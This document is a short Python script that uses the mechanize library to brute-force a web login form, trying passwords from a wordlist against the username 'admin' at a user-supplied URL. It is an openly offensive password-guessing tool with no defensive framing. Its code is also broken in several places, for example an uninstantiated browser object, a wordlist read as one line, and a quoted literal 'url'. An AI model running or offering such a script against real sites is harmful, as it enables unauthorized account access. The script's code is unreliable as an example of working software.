import mechanize

a=mechanize.Browser

url=input("enter url :")
file=input("file path : ")
filename=open("word.txt","r")
passlist = filename.readline()
filename.close()
applied=0

for password in passlist:
    password= password.strip()
    print("password testing:{}".format(password))
    response=a.open('url')
    a.select_form['username']='admin'
    a.select_form['password']=password
    a.method = 'POST'
    response =a.submit()

    if response.geturl()== url:
        print("password found"+ password)
        break
    elif response.geturl()!= url:
        print('the number of apply: '+ str(applied))
        applied+=1
        print('the password trie:'+ password)
        continue

